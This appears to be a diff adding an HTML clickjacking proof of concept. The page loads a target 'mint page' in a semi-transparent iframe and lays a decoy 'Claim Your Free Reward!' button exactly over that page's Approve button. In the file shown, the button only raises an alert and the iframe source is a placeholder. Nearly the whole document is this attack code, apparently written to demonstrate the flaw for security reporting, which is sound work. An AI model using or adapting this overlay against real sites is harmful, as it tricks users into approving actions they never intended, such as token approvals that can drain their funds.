@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        /* Style for the iframe */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1366px; /* Match the width of the original mint page */
+            height: 653px; /* Match the height of the original mint page */
+            opacity: 0.4; /* Makes it semi-visible but still interactable */
+            z-index: 10; /* Ensures it's on top */
+        }
+
+        /* Style for the fake button */
+        .fake-button {
+            position: absolute;
+            z-index: 20; /* Above iframe */
+            left: 268px; /* Adjusted X position to match the Approve button */
+            top: 595px; /* Adjusted Y position to match the Approve button */
+            width: 280px; /* Width of the Approve button */
+            height: 55px; /* Height of the Approve button */
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 8px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 55px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: 0.3s;
+        }
+
+        /* Hover effect for the button */
+        .fake-button:hover {
+            background-color: #45a049;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Text on the fake button */
+        .fake-button:before {
+            content: 'Claim Your Free Reward!';
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Fake button that triggers an alert when clicked -->
+    <div class="fake-button" onclick="alert('Button clicked!');"></div>
+
+    <!-- Iframe embedding the target page (replace with actual URL of mint page) -->
+    <iframe src="url"></iframe>
+
+</body>
+</html>
